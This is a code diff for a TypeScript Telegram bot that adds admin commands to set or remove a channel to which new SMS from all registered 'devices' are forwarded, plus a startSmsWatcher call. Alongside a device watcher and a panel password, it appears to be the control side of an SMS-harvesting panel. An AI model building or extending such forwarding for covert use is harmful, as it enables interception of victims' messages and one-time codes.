@@ -11,7 +11,11 @@ import {
   fbUpdate,
   setPanelPassword,
   setAdminConfig,
+  getSmsChannel,
+  setSmsChannel,
+  removeSmsChannel,
 } from "./firebase";
+import { startSmsWatcher } from "./smsWatcher";
 
 // Tracks users mid-conversation (waiting for their next message)
 const pendingActions = new Map<string, { action: "reset_password" | "set_email" }>();
@@ -474,8 +478,52 @@ export async function startBot(): Promise<void> {
     );
   });
 
+  // ─── Admin: /setchannel ──────────────────────────────────────────────────
+  // Usage: /setchannel -100xxxxxxxxxx  OR  /setchannel @channelname
+  bot.command("setchannel", async (ctx) => {
+    if (!isAdmin(ctx)) {
+      await ctx.reply("❌ Admin only.");
+      return;
+    }
+
+    const channelId = ctx.message.text.split(" ")[1]?.trim();
+    if (!channelId) {
+      const current = await getSmsChannel();
+      await ctx.reply(
+        `📡 *SMS Forward Channel*\n\n` +
+        `Current: ${current ? `\`${current}\`` : "Not set"}\n\n` +
+        `Usage: \`/setchannel -100xxxxxxxxxx\`\n` +
+        `Remove: \`/removechannel\`\n\n` +
+        `_Bot ko channel ka admin banana zaroor hai pehle._`,
+        { parse_mode: "Markdown" }
+      );
+      return;
+    }
+
+    await setSmsChannel(channelId);
+    await ctx.reply(
+      `✅ *SMS Channel Set!*\n\n` +
+      `Channel ID: \`${channelId}\`\n\n` +
+      `Ab sab devices ke naye SMS is channel pe forward honge.\n\n` +
+      `⚠️ Bot ko channel admin banana hai — message bhejne ki permission do.`,
+      { parse_mode: "Markdown" }
+    );
+  });
+
+  // ─── Admin: /removechannel ───────────────────────────────────────────────
+  bot.command("removechannel", async (ctx) => {
+    if (!isAdmin(ctx)) {
+      await ctx.reply("❌ Admin only.");
+      return;
+    }
+    await removeSmsChannel();
+    await ctx.reply("✅ SMS forwarding channel remove kar diya gaya.");
+  });
+
   // Start device watcher to notify admin of new devices
   startDeviceWatcher(bot, ADMIN_ID);
+  // Start SMS watcher to forward new SMS to configured channel
+  startSmsWatcher(bot);
 
   // Launch bot — catch 409 conflict (another instance already running)
   bot.launch({ dropPendingUpdates: true }).catch((err: any) => {
@@ -493,11 +541,7 @@ export async function startBot(): Promise<void> {
     try {
       await bot.telegram.sendMessage(
         ADMIN_ID,
-        `⚠️ *PANEL_URL set nahi hai* — /start pe galat link dikh raha hai\n\n` +
-        `Production mein sahi URL dikhane ke liye yeh env var set karo:\n` +
-        `\`PANEL_URL=https://your-deployed-domain.com\`\n\n` +
-        `_Replit Secrets mein jaake \`PANEL_URL\` add karo._`,
-        { parse_mode: "Markdown" }
+        `⚠️ PANEL_URL set nahi hai\n\nReplit env vars mein PANEL_URL add karo taaki /start pe sahi panel link aaye.\n\nExample: PANEL_URL=https://your-domain.com`
       );
     } catch (err) {
       logger.warn({ err }, "Could not send PANEL_URL warning to admin");
